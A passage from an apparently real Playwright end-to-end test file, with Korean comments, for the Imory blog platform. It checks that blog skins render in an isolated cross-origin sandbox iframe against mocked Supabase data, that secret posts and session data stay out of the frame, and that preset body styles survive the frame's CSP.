    { id: 1, user_id: HOME_OWNER_ID, name: "TXT", type: "post", sort_order: 1 },
    { id: 2, user_id: HOME_OWNER_ID, name: "PIC", type: "gallery", sort_order: 2 },

    /*
      SANDBOX-3 — BANNER / HIGHLIGHT 화면도 프레임에서 그려진다.
      두 타입은 블로그당 하나뿐이다
      (IMORY_HIGHLIGHT2_CATEGORY_AND_SETTINGS.md singleton).
    */
    { id: 3, user_id: HOME_OWNER_ID, name: "LINKS", type: "banner", sort_order: 3 },
    { id: 4, user_id: HOME_OWNER_ID, name: "밑줄", type: "highlight", sort_order: 4 }
  ],
  posts: [
    { id: 101, user_id: HOME_OWNER_ID, category_id: 1, title: "첫 번째 글",
      content_type: "text", visibility: "public",
      created_at: "2026-09-01T02:00:00Z", quote_preset_id: null },

    /*
      SANDBOX-2 — 이동 검증용 두 번째 글. 같은 카테고리에 있어서
      CATEGORY 목록에 둘이 나오고, 그중 하나를 눌러 POST 로
      들어간 뒤 다시 카테고리로 돌아오는 길을 잰다.
    */
    { id: 102, user_id: HOME_OWNER_ID, category_id: 1, title: "두 번째 글",
      content_type: "text", visibility: "public",
      created_at: "2026-09-02T02:00:00Z", quote_preset_id: null },

    /*
      비밀글 — sandbox 경로를 타지 않는다는 것(기존 native viewer 로
      폴백)을 이 글로 확인한다.
    */
    { id: 103, user_id: HOME_OWNER_ID, category_id: 1, title: "잠긴 글",
      content_type: "text", visibility: "secret",
      created_at: "2026-09-03T02:00:00Z", quote_preset_id: null },

    /*
      SANDBOX-3 — 갤러리 카테고리(PIC)의 글. 이 fixture 의
      templates.category 는 category.gallery 를 쓰지 않으므로 갤러리
      모드가 켜지지 않고 평면 목록으로 그려진다
      (skinTemplateUsesGallery, IMORY_GALLERY1_DESIGN.md §4) —
      여기서 보려는 것은 "갤러리 타입도 같은 프레임 경로를 탄다"다.
    */
    { id: 201, user_id: HOME_OWNER_ID, category_id: 2, title: "사진 글",
      content_type: "text", visibility: "public",
      created_at: "2026-08-20T02:00:00Z", quote_preset_id: null }
  ],
  post_contents: [
    /*
      ★ SANDBOX-3.2 — 장식이 든 진짜 글 한 벌.

      형광펜(.post-inline-highlight) · 강조선 마커(.post-para-rule) ·
      포인트 색(.post-inline-color) · 복사 상자 · 구분선. 이 다섯이
      본문 파이프라인이 만드는 결과 중 **class 규칙에 기대는**
      것들이라(posts/posts-body-shared.css · posts-body-blocks.css),
      프레임이 그 CSS 를 읽지 않으면 여기서만 모양이 달라진다.

      기존 절들은 "첫 번째 글의 본문" 문장만 보므로 그 문장은
      그대로 두고 장식만 둘렀다.
    */
    { post_id: 101, content: "<span class=\"post-inline-highlight\" data-highlight=\"#f4dce6\" style=\"background-color: rgb(244, 220, 230);\">첫 번째 글의 본문이다.</span><br><br><span class=\"post-para-rule\" data-rule=\"on\" data-rule-color=\"#ee9fbd\"></span><span class=\"post-inline-color\" data-point-color=\"#ff8c82\" style=\"color: rgb(255, 140, 130);\">강조선</span>이 걸린 문단이다.<br>두 번째 줄.<div class=\"post-copy-box\"><span class=\"post-copy-box-title\">COPY</span><span class=\"post-copy-box-body\">copy me</span></div><div class=\"post-divider\" data-divider=\"dotted\"></div>" },
    { post_id: 102, content: "<p>두 번째 글의 본문이다.</p>" },
    { post_id: 103, content: "<p>비밀 본문</p>" },
    { post_id: 201, content: "<p>사진 글의 본문이다.</p>" }
  ],
  post_folders: [],
  post_gallery_images: [],
  post_covers: [],

  /*
    SANDBOX-3 — 하이라이트 카드 한 장. 공개 글(101)에 걸려 있어서
    방문자도 본다. 비밀글(103)에는 걸지 않는다 — 그 gate 는
    posts/posts-highlight-e2e-test.mjs --only=protect 가 본다.
  */
  post_highlights: [
    {
      id: "hl-1", user_id: HOME_OWNER_ID, post_id: 101,
      color: "#ffd400",
      excerpt: "첫 번째 글의", prefix: "", suffix: " 본문이다.",
      text_start: 0, note: "여기 메모가 있다",
      created_at: "2026-09-04T02:00:00Z", updated_at: "2026-09-04T02:00:00Z"
    }
  ],

  banners: [
    { id: 11, user_id: HOME_OWNER_ID, category_id: 3, name: "첫 배너",
      url: "/testuser/category/1", image_url: "/skin/test-skins/imory-diary-avatar-placeholder.svg",
      sort_order: 1 }
  ],

  /*
    ★ SANDBOX-3.1 — 공개 sandbox POST 의 본문 서식이 실제로
    프레임까지 오는지 보려면 프리셋이 있어야 한다. 기본값과 확실히
    다른 값으로 채운다(bodyWeight/bodyAlign/lineBreak 은 문자열
    키다 — posts/style/posts-body-layout.js postStyleText).
  */
  quote_presets: [
    {
      id: "qp-sandbox",
      user_id: HOME_OWNER_ID,
      name: "Vibe",
      is_active: true,
      settings: {
        bodyFont: "nanummyeongjo",
        bodyColor: "#332211",
        bodySize: 19,
        bodyWeight: "500",
        lineHeight: 1.9,
        letterSpacing: 0.4,
        bodyAlign: "justify",
        lineBreak: "char",
        highlightHeight: 45,

        /* 문단 강조선 — .post-para-rule-box 가 실제로 그려지도록 */
        bodyRuleColor: "#ee9fbd",
        bodyRuleWidth: 3,
        bodyRuleGap: 12,
        paragraphSpacing: 14
      }
    }
  ]
};

const HOME_RESERVED_PARAMS =
  new Set(["select", "order", "limit", "offset", "on_conflict", "columns"]);

/*
  post_highlights 는 embed select(posts!inner (...)) 로 조회된다
  (posts/view/posts-view-highlight-store.js loadHighlightCards).
  아래 평면 select 처리로는 그 모양을 만들 수 없어서 이 표만
  따로 조립한다 — 카드가 가리키는 글의 제목/카테고리/공개 여부가
  같은 행에 붙어 와야 Context 가 카드를 만들 수 있다.
*/

function homeHighlightRows(params) {

  const owner = params.get("user_id");

  return (HOME_DB.post_highlights || [])
    .filter(r => !owner || ("eq." + r.user_id) === owner)
    .map(r => {

      const post =
        (HOME_DB.posts || []).find(p => String(p.id) === String(r.post_id));

      if (!post) return null;

      return {
        id: r.id, post_id: r.post_id, color: r.color, excerpt: r.excerpt,
        prefix: r.prefix, suffix: r.suffix, text_start: r.text_start,
        note: r.note, created_at: r.created_at, updated_at: r.updated_at,
        posts: {
          id: post.id, title: post.title, category_id: post.category_id,
          folder_id: post.folder_id === undefined ? null : post.folder_id,
          visibility: post.visibility, updated_at: post.created_at
        }
      };

    })
    .filter(Boolean);

}


function homeQueryTable(table, params) {

  if (table === "post_highlights") {
    return homeHighlightRows(params);
  }

  let rows = (HOME_DB[table] || []).map(r => ({ ...r }));

  /*
    PUBLIC-NUMBER-1: 공개 주소의 번호(categories.public_no /
    posts.public_no)를 이 mock 이 대신 채운다. 실제 DB 에서는 트리거가
    블로그마다 1 부터 매기지만, 여기서는 **id 와 같은 값**을 준다 —
    그래야 이 파일이 원래 확인하던 주소가 그대로 유지되고, 검사의
    초점이 번호 체계 변경에 가려지지 않는다. 번호와 id 가 **다를
    때**의 동작은 skin/skin-public-number-e2e-test.mjs 가 따로 본다.
  */
  if (table === "posts" || table === "categories") {
    rows = rows.map(row => (
      row && row.public_no === undefined && row.id !== undefined
        ? { ...row, public_no: row.id }
        : row
    ));
  }

  for (const [key, raw] of params.entries()) {
    if (HOME_RESERVED_PARAMS.has(key)) continue;
    const m = /^(eq|neq|in|gt|gte|lt|lte)\.(.*)$/s.exec(raw);
    if (!m) continue;
    const [, op, val] = m;
    if (op === "in") {
      const list = val.replace(/^\(|\)$/g, "").split(",").map(v => v.replace(/^"|"$/g, ""));
      rows = rows.filter(r => list.includes(String(r[key])));
      continue;
    }
    rows = rows.filter(r => {
      const cur = r[key];
      if (op === "eq") return String(cur) === val;
      if (op === "neq") return String(cur) !== val;
      return true;
    });
  }

  const limit = params.get("limit");
  if (limit) rows = rows.slice(0, Number(limit));

  const select = params.get("select");
  if (select && select !== "*") {
    const cols = select.split(",").map(s => s.trim()).filter(Boolean);
    rows = rows.map(r => Object.fromEntries(cols.map(c => [c, r[c]])));
  }

  return rows;

}


async function installHomeSupabaseMock(page, skinPackage) {

  await page.route("https://" + SUPABASE_HOST + "/**", async route => {

    const req = route.request();
    const url = new URL(req.url());

    /*
      ★ preflight 응답에 허용 메서드를 명시한다.

      WebKit 은 Access-Control-Allow-Methods 가 없는 preflight 를
      간헐적으로 거절한다("due to access control checks") — chromium
      은 넘어가므로 두 브라우저에서 결과가 갈렸다. mock 의 문제이지
      제품 코드의 문제가 아니라, 여기서 헤더를 채워 재현을 없앤다.
    */

    const headers = {
      "access-control-allow-origin": "*",
      "access-control-allow-headers": "*",
      "access-control-allow-methods": "GET,POST,PATCH,DELETE,OPTIONS,HEAD",
      "access-control-expose-headers": "*",
      "access-control-max-age": "600"
    };

    if (req.method() === "OPTIONS") {
      return route.fulfill({ status: 204, headers });
    }

    if (url.pathname.startsWith("/auth/v1")) {
      return route.fulfill({
        status: 401, headers, contentType: "application/json",
        body: JSON.stringify({ message: "no session" })
      });
    }

    if (url.pathname.startsWith("/rest/v1/rpc/get_published_skin")) {
      return route.fulfill({
        status: 200, headers, contentType: "application/json",
        body: JSON.stringify({
          skin: skinPackage,
          schemaVersion: skinPackage.schemaVersion,
          imageSlotValues: {}
        })
      });
    }

    if (url.pathname.startsWith("/rest/v1/rpc/")) {
      return route.fulfill({
        status: 200, headers, contentType: "application/json", body: "null"
      });
    }

    if (url.pathname.startsWith("/rest/v1/")) {
      const rows = homeQueryTable(
        url.pathname.slice("/rest/v1/".length), url.searchParams
      );
      const single = (req.headers()["accept"] || "").includes("vnd.pgrst.object");
      if (single && rows.length === 0) {
        return route.fulfill({
          status: 406, headers, contentType: "application/json",
          body: JSON.stringify({ code: "PGRST116", message: "0 rows" })
        });
      }
      return route.fulfill({
        status: 200, headers,
        contentType: single ? "application/vnd.pgrst.object+json" : "application/json",
        body: JSON.stringify(single ? rows[0] : rows)
      });
    }

    return route.fulfill({ status: 404, headers, body: "{}" });

  });

  /* 외부 잡음 차단 — supabase-js 번들(cdn.jsdelivr.net/npm)은 통과시킨다 */

  for (const pattern of [
    "https://fonts.googleapis.com/**",
    "https://fonts.gstatic.com/**",
    "https://cdn.jsdelivr.net/gh/**",
    "https://unpkg.com/**"
  ]) {
    await page.route(pattern, r => r.abort());
  }

}


async function openPublicHome(browser, skinPackage, query) {

  const ctx = await browser.newContext({ viewport: { width: 900, height: 900 } });
  const page = await ctx.newPage();

  const pageErrors = [];
  page.on("pageerror", err => pageErrors.push(String(err && err.message || err)));

  await installHomeSupabaseMock(page, skinPackage);

  await page.goto(
    PARENT_ORIGIN + "/" + HOME_SLUG + "/" + (query || ""),
    { waitUntil: "load" }
  );

  return { ctx, page, pageErrors };

}


/* =========================================================
   openPublicPath(browser, skinPackage, subPath, options)

   SANDBOX-2 — 이동이 생기면서 주소가 바뀐다. 그래서 dev opt-in 을
   **쿼리가 아니라 localStorage 로** 건다(그러지 않으면 두 번째
   화면부터 플래그가 꺼져 native 로 떨어진다 —
   skin/sandbox/skin-sandbox-config.js 의 dev 저장소 키 주석).
   production 은 이 분기를 타지 않는다(hostname + slug allowlist).
========================================================== */

async function openPublicPath(browser, skinPackage, subPath, options) {

  const opts = options || {};

  const ctx = await browser.newContext({
    viewport: opts.viewport || { width: 900, height: 900 }
  });

  const page = await ctx.newPage();

  const pageErrors = [];
  page.on("pageerror", err => pageErrors.push(String(err && err.message || err)));

  await page.addInitScript(
    ([origin, sandboxEnabled, authorJsEnabled]) => {
      try {
        if (sandboxEnabled) {
          localStorage.setItem("imory.sandboxSkin", "1");
          localStorage.setItem("imory.sandboxSkinOrigin", origin);
        }
        /*
          ★ SANDBOX-5A — 저자 JS 는 **별도** opt-in 이다. 이 줄이
          없으면 sandbox 프레임은 뜨지만 저자 JS 는 한 줄도 돌지
          않는다(그것이 기존 절들이 이 라운드 뒤에도 그대로 도는
          이유다).
        */
        if (authorJsEnabled) {
          localStorage.setItem("imory.sandboxSkinJs", "1");
        }
      } catch (err) { /* 저장소가 막혀 있으면 플래그 없이 돈다 */ }
    },
    [SANDBOX_ORIGIN, opts.sandbox !== false, opts.authorJs === true]
  );

  await installHomeSupabaseMock(page, skinPackage);

  await page.goto(
    PARENT_ORIGIN + "/" + HOME_SLUG + (subPath || "/"),
    { waitUntil: "load" }
  );

  return { ctx, page, pageErrors };

}


/*
  "지금 **보이는** 화면을 그리고 있는 sandbox 프레임" 하나를 기다린다.

  ★ 보이는 것만 센다. 화면을 옮겨도 이전 화면의 컨테이너(#postList /
  #postSkinContainer)는 hidden 으로 남아 있을 뿐 비워지지 않는다 —
  native 스킨도 똑같이 옛 DOM 을 그 자리에 두고 다음 진입에서
  덮어쓴다. 그래서 "떠 있는 프레임" 만으로 찾으면 옛 화면의
  프레임을 집어 와서 테스트가 한 박자 이르게 통과한다.
*/

async function waitForSandboxPage(page, pageType, timeout) {

  const deadline = Date.now() + (timeout || 20000);

  while (Date.now() < deadline) {

    const elements =
      await page.$$("iframe.imory-skin-sandbox-frame");

    for (const element of elements) {

      try {

        if (!(await element.isVisible())) continue;

        const frame = await element.contentFrame();

        if (!frame || !frame.url().startsWith(SANDBOX_ORIGIN)) continue;

        const type = await frame.evaluate(() => {
          const root = document.getElementById("sandboxFrameRoot");
          return root &&
            root.getAttribute("data-imory-sandbox-state") === "rendered"
            ? root.getAttribute("data-imory-sandbox-page")
            : null;
        });

        if (type && (!pageType || type === pageType)) return frame;

      } catch (err) { /* 그 사이 프레임이 사라졌다 — 다음 바퀴에 */ }

    }

    await page.waitForTimeout(100);

  }

  return null;

}


async function runHome(browser) {

  console.log("\n[home] 공개 HOME 경로 (실제 index.html)");

  const sandboxPkg =
    JSON.parse(
      fs.readFileSync(
        path.join(ROOT, "skin", "test-skins", "imory-sandbox-home-v1.json"),
        "utf8"
      )
    );

  const nativePkg =
    JSON.parse(JSON.stringify(sandboxPkg));

  delete nativePkg.renderMode;


  /* --- 1. renderMode 없는 스킨: 오늘과 같은 경로 ---------- */

  {
    const { ctx, page, pageErrors } =
      await openPublicHome(browser, nativePkg, ON_QUERY);

    await page.waitForSelector("#themeMount .imory-skin-root", { timeout: 20000 });

    check("[home] ★ renderMode 없는 스킨은 같은 문서에 그려진다 (오늘과 동일)",
      (await page.locator("#themeMount .imory-skin-root").count()) === 1);

    check("[home] ★ 그때 문서에 sandbox iframe 이 하나도 없다",
      (await page.locator("iframe.imory-skin-sandbox-frame").count()) === 0);

    check("[home] 공개 mount 계약(.theme-mount--skin)이 붙는다",
      (await page.locator("#themeMount.theme-mount--skin").count()) === 1);

    check("[home] 페이지 오류 없음", pageErrors.length === 0, pageErrors.join(" | "));

    await ctx.close();
  }


  /* --- 2. sandbox 스킨 + 플래그 OFF: native 로 그린다 ----- */

  {
    const { ctx, page, pageErrors } =
      await openPublicHome(browser, sandboxPkg, "");

    await page.waitForSelector("#themeMount .imory-skin-root", { timeout: 20000 });

    check("[home] ★ 플래그가 꺼져 있으면 sandbox 스킨도 native 로 그린다",
      (await page.locator("#themeMount .imory-skin-root").count()) === 1 &&
      (await page.locator("iframe.imory-skin-sandbox-frame").count()) === 0);

    check("[home] ★ 즉 배포에 이 코드가 있어도 공개 화면이 바뀌지 않는다",
      (await page.locator("#themeMount.theme-mount--skin").count()) === 1);

    check("[home] 페이지 오류 없음", pageErrors.length === 0, pageErrors.join(" | "));

    await ctx.close();
  }


  /* --- 3. sandbox 스킨 + 플래그 ON: 프레임에 그린다 ------- */

  {
    const { ctx, page, pageErrors } =
      await openPublicHome(browser, sandboxPkg, ON_QUERY);

    await page.waitForSelector("iframe.imory-skin-sandbox-frame", { timeout: 20000 });

    check("[home] ★ sandbox 스킨은 #themeMount 안에 cross-origin iframe 으로 뜬다",
      (await page.locator("#themeMount iframe.imory-skin-sandbox-frame").count()) === 1);

    check("[home] 그 iframe 의 src 가 frame origin 이다",
      ((await page.locator("iframe.imory-skin-sandbox-frame").getAttribute("src")) || "")
        .startsWith(SANDBOX_ORIGIN));

    check("[home] ★ 같은 문서에는 스킨이 그려지지 않는다 (중복 렌더 없음)",
      (await page.locator("#themeMount > .imory-skin-root").count()) === 0);

    const frame = await waitForSandboxRender(page);

    check("[home] ★ 프레임이 렌더를 끝냈다", Boolean(frame));

    if (frame) {

      const text =
        await frame.locator("#sandboxFrameRoot").innerText();

      check("[home] ★ 실제 DB(mock) 의 블로그 제목이 프레임에 그려졌다",
        text.includes("SANDBOX DEMO"), text.slice(0, 60));

      check("[home] ★ 실제 카테고리 이름이 프레임에 그려졌다",
        text.includes("TXT") && text.includes("PIC"));

      check("[home] ★ 실제 글 제목이 프레임에 그려졌다",
        text.includes("첫 번째 글"));

      check("[home] ★ 프레임에 supabase 전역이 없다",
        (await frame.evaluate(() => typeof window.supabase)) === "undefined" &&
        (await frame.evaluate(() => typeof window.supabaseClient)) === "undefined");

      check("[home] ★ 프레임 localStorage 에 Imory 세션 키가 없다",
        (await frame.evaluate(() => {
          try { return Object.keys(localStorage).length; }
          catch (err) { return -1; }
        })) <= 0);

    }

    check("[home] 공개 mount 계약(.theme-mount--skin)이 그대로 붙는다",
      (await page.locator("#themeMount.theme-mount--skin").count()) === 1);

    check("[home] 부모 문서에 가로 넘침이 없다",
      (await page.evaluate(() =>
        document.documentElement.scrollWidth - document.documentElement.clientWidth)) <= 0);

    check("[home] 페이지 오류 없음", pageErrors.length === 0, pageErrors.join(" | "));

    await ctx.close();
  }


  /* --- 4. 프레임이 안 뜨면 같은 스킨을 native 로 --------- */

  {
    const ctx = await browser.newContext({ viewport: { width: 900, height: 900 } });
    const page = await ctx.newPage();

    const pageErrors = [];
    page.on("pageerror", err => pageErrors.push(String(err && err.message || err)));

    await installHomeSupabaseMock(page, sandboxPkg);

    await page.route(
      SANDBOX_ORIGIN + "/skin/sandbox/frame*",
      route => route.abort()
    );

    await page.goto(
      PARENT_ORIGIN + "/" + HOME_SLUG + "/" + ON_QUERY,
      { waitUntil: "load" }
    );

    await page.waitForSelector("#themeMount .imory-skin-root", { timeout: 30000 });

    check("[home] ★ 프레임이 안 뜨면 같은 스킨을 native 로 그린다 (백지 아님)",
      (await page.locator("#themeMount .imory-skin-root").count()) === 1);

    check("[home] ★ 그때 iframe 을 남기지 않는다",
      (await page.locator("iframe.imory-skin-sandbox-frame").count()) === 0);

    check("[home] ★ 폴백 화면에도 실제 데이터가 들어 있다",
      (await page.locator("#themeMount .imory-skin-root").innerText())
        .includes("SANDBOX DEMO"));

    check("[home] 페이지 오류 없음", pageErrors.length === 0, pageErrors.join(" | "));

    await ctx.close();
  }

}


/* =========================================================
   [pages] SANDBOX-2 — CATEGORY / POST 도 프레임에서 그려진다

   HOME 과 같은 문서(진짜 index.html)를 쓰되 주소만 다르게 들어간다.
   supabase 만 mock 이고 라우팅·Context 조립·본문 서식은 전부
   저장소의 실제 코드다.
========================================================== */

function readSandboxPkg() {

  return JSON.parse(
    fs.readFileSync(
      path.join(ROOT, "skin", "test-skins", "imory-sandbox-home-v1.json"),
      "utf8"
    )
  );

}


async function runPages(browser) {

  console.log("\n[pages] CATEGORY / POST 렌더");

  const sandboxPkg = readSandboxPkg();


  /* --- CATEGORY ---------------------------------------- */

  {
    const { ctx, page, pageErrors } =
      await openPublicPath(browser, sandboxPkg, "/category/1");

    const frame = await waitForSandboxPage(page, "category");

    check("[pages] ★ CATEGORY 가 별도 origin 프레임에서 그려진다",
      Boolean(frame));

    if (frame) {

      const text = await frame.locator("#sandboxFrameRoot").innerText();

      check("[pages] ★ 카테고리 이름이 프레임에 그려졌다",
        text.includes("TXT"), text.slice(0, 80));

      check("[pages] ★ 그 카테고리의 글 목록이 그려졌다",
        text.includes("첫 번째 글") && text.includes("두 번째 글"));

      /*
        비밀글은 목록에서 제목 앞에 자물쇠가 붙는다(기존 계약 —
        skin/skin-context.js maskSkinPostTitle). 여기서 보는 것은
        그 계약이 프레임에서도 같다는 것과, **본문은 어디에도
        없다**는 것이다.
      */

      check("[pages] ★ 비밀글은 자물쇠가 붙은 제목으로 온다",
        text.includes("🔒 잠긴 글"), text.slice(0, 160));

      check("[pages] ★ 비밀 본문은 프레임에 도착하지 않았다",
        (await frame.evaluate(() =>
          JSON.stringify(window.__imorySandboxLastReceived || {})))
          .indexOf("비밀 본문") === -1);

      check("[pages] ★ 프레임에 supabase 전역이 없다",
        (await frame.evaluate(() => typeof window.supabaseClient)) === "undefined");

      check("[pages] ★ 도착한 data 의 post/home namespace 는 null 이다",
        (await frame.evaluate(() => {
          const d = window.__imorySandboxLastReceived || {};
          return d.pageType === "category" && d.home === null && d.post === null;
        })) === true);

    }

    check("[pages] ★ 같은 문서에 스킨이 중복으로 그려지지 않는다",
      (await page.locator("#postList > .imory-skin-root").count()) === 0);

    check("[pages] 부모 문서에 가로 넘침이 없다",
      (await page.evaluate(() =>
        document.documentElement.scrollWidth -
        document.documentElement.clientWidth)) <= 0);

    check("[pages] 페이지 오류 없음", pageErrors.length === 0, pageErrors.join(" | "));

    await ctx.close();
  }


  /* --- POST (본문은 별도 메시지로) ---------------------- */

  {
    const { ctx, page, pageErrors } =
      await openPublicPath(browser, sandboxPkg, "/post/101");

    const frame = await waitForSandboxPage(page, "post");

    check("[pages] ★ POST 가 별도 origin 프레임에서 그려진다",
      Boolean(frame));

    if (frame) {

      check("[pages] ★ 글 제목이 프레임에 그려졌다",
        (await frame.locator("#sandboxFrameRoot").innerText()).includes("첫 번째 글"));

      /* 본문은 IMORY_POST_BODY 로 나중에 온다 */

      await frame.waitForFunction(
        () => (document.querySelector('[data-imory-region="post-body"]')
          || { textContent: "" }).textContent.trim().length > 0,
        null,
        { timeout: 15000 }
      ).catch(() => {});

      const bodyText =
        await frame.locator('[data-imory-region="post-body"]').innerText();

      check("[pages] ★ 본문이 post-body region 에 들어왔다",
        bodyText.includes("첫 번째 글의 본문"), bodyText.slice(0, 80));

      check("[pages] ★ 본문은 Context 가 아니라 별도 메시지로 왔다",
        (await frame.evaluate(() =>
          JSON.stringify(window.__imorySandboxLastReceived || {})))
          .indexOf("본문이다") === -1);


      /* =====================================================
         ★ SANDBOX-3.1 — 본문 서식이 프레임 CSP 를 통과했는가

         프레임 CSP 에는 style-src 'unsafe-inline' 이 없다. 본문의
         inline style 을 그대로 보내면 글자만 남고 Quote Preset 이
         통째로 빠진다. 부모가 그 선언을 검증해 stylesheet 로
         옮기고(posts/style/posts-body-style-extract.js), 프레임이
         nonce 가 붙은 <style> 에 넣는다.

         여기서는 **계산값**으로 판정한다 — style 속성이 남아 있는지가
         아니라 화면이 그 값으로 그려졌는지를 본다.
      ====================================================== */

      const bodyStyle =
        await frame.locator('[data-imory-region="post-body"]').evaluate((el) => {
          const s = getComputedStyle(el);
          return {
            fontFamily: s.fontFamily,
            fontSize: s.fontSize,
            fontWeight: s.fontWeight,
            color: s.color,
            lineHeight: s.lineHeight,
            letterSpacing: s.letterSpacing,
            textAlign: s.textAlign,
            wordBreak: s.wordBreak,
            styleAttrs: document.querySelectorAll("#sandboxFrameRoot [style]").length,
            sheets: document.querySelectorAll("style[data-imory-post-body-style]").length
          };
        });

      check("[pages] ★ 본문 글꼴이 프리셋 그대로 (Nanum Myeongjo)",
        bodyStyle.fontFamily.includes("Nanum Myeongjo"), bodyStyle.fontFamily);

      check("[pages] ★ 본문 글자 크기가 프리셋 그대로 (19px)",
        bodyStyle.fontSize === "19px", bodyStyle.fontSize);

      check("[pages] ★ 본문 글자 굵기가 프리셋 그대로 (500)",
        bodyStyle.fontWeight === "500", bodyStyle.fontWeight);

      check("[pages] ★ 본문 색이 프리셋 그대로 (#332211)",
        bodyStyle.color === "rgb(51, 34, 17)", bodyStyle.color);

      check("[pages] ★ 줄간격이 프리셋 그대로 (19 × 1.9)",
        Math.abs(parseFloat(bodyStyle.lineHeight) - 36.1) < 0.6,
        bodyStyle.lineHeight);

      check("[pages] ★ 자간이 프리셋 그대로 (0.4px)",
        Math.abs(parseFloat(bodyStyle.letterSpacing) - 0.4) < 0.05,
        bodyStyle.letterSpacing);

      check("[pages] ★ 정렬이 프리셋 그대로 (justify)",
        bodyStyle.textAlign === "justify", bodyStyle.textAlign);

      check("[pages] ★ 줄바꿈 모드가 프리셋 그대로 (break-all)",
        bodyStyle.wordBreak === "break-all", bodyStyle.wordBreak);

      check("[pages] ★ 프레임에 style 속성이 하나도 남지 않았다",
        bodyStyle.styleAttrs === 0, String(bodyStyle.styleAttrs));

      check("[pages] ★ 본문 서식 <style> 이 nonce 를 달고 정확히 1개",
        bodyStyle.sheets === 1, String(bodyStyle.sheets));

      check("[pages] ★ inline style CSP 위반이 하나도 나지 않았다",
        pageErrors.filter(t => /inline style/i.test(t)).length === 0,
        pageErrors.join(" | ").slice(0, 160));

    }

    check("[pages] 페이지 오류 없음", pageErrors.length === 0, pageErrors.join(" | "));

    await ctx.close();
  }


  /* --- 비밀글은 sandbox 를 쓰지 않는다 ------------------ */

  {
    const { ctx, page, pageErrors } =
      await openPublicPath(browser, sandboxPkg, "/post/103");

    await page.waitForTimeout(3000);

    /*
      여기서 보는 것은 "**글 자리**에 프레임이 생기지 않았는가"다.

      ★ SANDBOX-5B — 이제 HOME 자리에도 프레임이 없다. 글 화면이
      현재 화면이 되는 순간 HOME 프레임은 내려가기 때문이다. 즉
      비밀글 화면에서는 문서 전체에 sandbox 프레임이 0개다.
    */

    check("[pages] ★ 비밀글 POST 는 글 자리에 sandbox 프레임을 만들지 않는다 (native 폴백)",
      (await page.locator("#postSkinContainer iframe.imory-skin-sandbox-frame").count()) === 0 &&
      (await waitForSandboxPage(page, "post", 3000)) === null);

    check("[pages] ★ 비밀글 화면에서는 문서 전체에 sandbox 프레임이 0개다",
      (await countVisibleSandboxFrames(page)) === 0);

    check("[pages] ★ 그때 비밀 본문이 문서 어디에도 없다",
      (await page.content()).indexOf("비밀 본문") === -1);

    check("[pages] 페이지 오류 없음", pageErrors.length === 0, pageErrors.join(" | "));

    await ctx.close();
  }


  /* --- renderMode 없는 스킨의 CATEGORY/POST 회귀 -------- */

  {
    const nativePkg = readSandboxPkg();
    delete nativePkg.renderMode;

    for (const [sub, needle] of [["/category/1", "TXT"], ["/post/101", "첫 번째 글"]]) {

      const { ctx, page, pageErrors } =
        await openPublicPath(browser, nativePkg, sub);

      /*
        HOME 스킨도 #themeMount 에 함께 떠 있으므로(native 와 같다)
        이 화면이 그려지는 자리로 좁혀서 본다.
      */

      const host =
        sub.startsWith("/post") ? "#postSkinContainer" : "#postList";

      await page.waitForSelector(host + " .imory-skin-root", { timeout: 20000 });

      check(`[pages] ★ native 회귀 — ${sub} 는 같은 문서에 그려진다`,
        (await page.locator("iframe.imory-skin-sandbox-frame").count()) === 0 &&
        (await page.locator(host + " .imory-skin-root").first().innerText())
          .includes(needle));

      check(`[pages] native 회귀 — ${sub} 페이지 오류 없음`,
        pageErrors.length === 0, pageErrors.join(" | "));

      await ctx.close();

    }
  }

}


/* =========================================================
   [surfaces] SANDBOX-3 — GALLERY / BANNER / HIGHLIGHTS

   SANDBOX-2 는 post형 CATEGORY 와 POST 만 프레임으로 가져갔다.
   나머지 공개 화면은 진입 모듈에 분기가 없어서 renderMode 를
   보지도 않았고, 그래서 sandbox 스킨인데도 native(배너는 legacy
   그리드)로 그려졌다. 이 절이 그 누락을 화면 단위로 잰다.

   보는 것:
     · 각 화면이 **보이는 sandbox 프레임 정확히 하나**로 그려진다
     · HOME 과 **같은 SkinPackage 의 디자인 체계**(sb-* 클래스 ·
       스킨 CSS)가 프레임 안에 적용된다
     · 직접 접속 / 새로고침 / 뒤로가기
     · 모바일 390px 가로 넘침 0
     · renderMode 없는 같은 스킨은 오늘과 똑같이 같은 문서에
       그려진다(native 회귀)
========================================================== */

/*
  **보이는** sandbox 프레임 개수. selector 를 주면 그 안에서만,
  주지 않으면 문서 전체에서 센다.

  ★ 2026-09-16 (SANDBOX-5B) 이전에는 컨테이너 안에서만 셌다

  그때는 HOME 프레임이 #themeMount 에 그대로 남는 것이 정상이라고
  보았기 때문이다(native 에서 HOME 스킨 DOM 이 남아 있는 것과
  같다고). 그것이 production 에서 "HOME → CATEGORY 뒤 프레임 둘"
  을 놓친 자리다 — 남은 프레임은 죽은 DOM 이 아니라 타이머와
  저자 JS 가 도는 살아 있는 문서다.

  지금 기준: **어느 공개 route 에서도 문서 전체에 보이는 sandbox
  프레임은 1개뿐이다**(sandbox 로 그리지 않는 화면이면 0개).
  그래서 이 헬퍼는 selector 없이 부르는 쪽이 기본이 됐다.
*/

async function countVisibleSandboxFrames(page, selector) {

  const elements =
    await page.$$((selector ? selector + " " : "") + "iframe.imory-skin-sandbox-frame");

  let n = 0;

  for (const element of elements) {

    try {
      if (await element.isVisible()) n += 1;
    }
    catch (err) { /* 그 사이 사라졌다 */ }

  }

  return n;

}


/*
  문서에 붙어 있는 sandbox iframe **요소**의 개수. 보이든 가려졌든
  센다 — 가려 두기만 한 프레임도 살아 있는 문서이고, 이 라운드가
  잡으려는 것이 정확히 그것이다.
*/

async function countSandboxFrameElements(page, selector) {

  return page.evaluate(
    (sel) =>
      document.querySelectorAll(
        (sel ? sel + " " : "") + "iframe.imory-skin-sandbox-frame"
      ).length,
    selector || null
  );

}


/*
  화면 전환은 한순간에 끝나지 않는다 — HOME 으로 돌아올 때는
  커튼(380ms)이 걷히는 동안 새 HOME 프레임과 내려갈 예정인 옛
  프레임이 잠깐 함께 있을 수 있다(그래야 옛 화면이 비어 보이지
  않는다). 판정은 그 전환이 끝난 뒤에 해야 하므로 여기서 기다린다.

  끝내 하나가 되지 않으면 그대로 두고 돌아온다 — 판정은 호출한
  check() 가 한다(이 함수가 테스트를 통과시키지 않는다).
*/

async function settleSingleSandboxFrame(page, timeout) {

  const deadline =
    Date.now() + (timeout || 6000);

  while (Date.now() < deadline) {

    const total =
      await countSandboxFrameElements(page);

    if (total <= 1) return total;

    await page.waitForTimeout(100);

  }

  return countSandboxFrameElements(page);

}


/*
